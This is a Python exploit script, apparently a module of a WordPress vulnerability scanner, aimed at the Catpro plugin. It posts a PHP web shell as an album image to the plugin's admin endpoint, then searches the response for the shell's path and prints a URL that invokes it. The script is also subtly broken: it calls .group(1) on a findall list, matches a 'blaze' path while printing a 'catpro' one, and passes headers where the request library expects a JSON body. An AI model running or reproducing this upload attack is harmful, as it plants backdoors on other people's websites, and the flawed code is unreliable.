import requests
import datetime
import time
import re

# catpro method
def wp_catpro(target):
    headers = {
        'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
        'Content_Type' : 'multipart/form-data'
    }
    options = {
            'album_img':[open('shell/VulnX.php','rb')],
            'task':'cpr_add_new_album',
            'album_name':'',
            'album_desc':''
    }
    endpoint = target + "/wp-admin/admin.php?page=catpro_manage"
    content = requests.post(endpoint,options,headers).text
    check_catpro = re.findall(r"\/uploads\/blaze\/(.*?)\/big\/VulnX.php", content)
    if check_catpro:
        path = check_catpro.group(1)
        dump_data = target + "/wp-content/uploads/catpro/"+path+"/big/VulnX.php?Vuln=X"
        print ('[+] Catpro Plugin ' + dump_data + ' ')
    else:
        print ('[-] Catpro Plugin')